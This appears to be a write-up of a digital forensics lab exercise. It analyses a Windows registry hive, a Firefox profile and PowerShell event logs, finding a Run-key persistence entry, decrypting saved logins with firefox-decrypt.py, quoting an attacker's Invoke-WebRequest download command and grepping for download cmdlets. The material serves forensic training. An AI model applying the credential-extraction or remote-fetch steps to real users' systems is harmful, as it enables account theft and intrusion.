# Registry - NTUSER.DAT

## What’s the mouse double-click speed?

```bash
sudo apt update && sudo apt install chntpw

chntpw -e NTUSER.DAT
cd Control Panel\Mouse
cat DoubleClickSpeed
# Value <DoubleClickSpeed> of type REG_SZ (1), data length 8 [0x8]
# 500
```

## What’s the most recent typed path accessed as recorded in the registry?
```bash
chntpw -e NTUSER.DAT
cd SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
cat url1
# Value <url1> of type REG_SZ (1), data length 58 [0x3a]
# C:\Windows\System32\calc.exe
```


## What’s the new value added to the registry by the malware in order to establish persistence over the system?
```bash
chntpw -e NTUSER.DAT
cd SOFTWARE\Microsoft\Windows\CurrentVersion\Run
ls
cat Malware
# Value <Malware> of type REG_SZ (1), data length 62 [0x3e]
# C:\Users\w\Desktop\malware.exe
```

# Firefox

## What’s the username and password stored in the saved logins?
````bash
python3 firefox-decrypt.py s6upyldt.default-release
# Website:   https://www.reddit.com
# Username: 'hackerman'
# Password: 'sup3rs3cur3p4ssw0rd
```

## What’s the most frequently visited website?
````bash
cd s6upyldt.default-release
sqlite3 places.sqlite "SELECT url, frecency, title FROM moz_places ORDER BY frecency;"
# ...
# https://tryhackme.com/|2075|TryHackMe | Cyber Security Training
```

## What’s the name of the file downloaded by the suspect?

````bash
sqlite3 places.sqlite "SELECT moz_places.url, moz_annos.content FROM moz_annos JOIN moz_places ON moz_places.id = moz_annos.place_id WHERE moz_annos.anno_attribute_id = (SELECT id FROM moz_anno_attributes WHERE name = 'downloads/destinationFileURI');"
# ...
# https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe|file:///C:/Users/w/Downloads/python-3.11.1-amd64(1).exe
```

# PowerShell Event logs

## What’s the command executed by the attacker to download a file on the system?
```bash
evtx_dump.py Microsoft-Windows-PowerShell%4Operational.evtx > ps.txt
grep -Ei "DownloadFile|DownloadString|iwr|Invoke-WebRequest|Start-BitsTransfer" ps.txt
#        Command Name = Invoke-WebRequest
# <Data Name="ScriptBlockText">Invoke-WebRequest -UseBasicParsing -Uri https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%202/files/file.ps1 -OutFile "file.ps1"</Data>
```

## Can you analyze the downloaded file and understand what’s the purpose of that file?
```bash
cat file.ps1
echo "" | base64 -d
# flag
```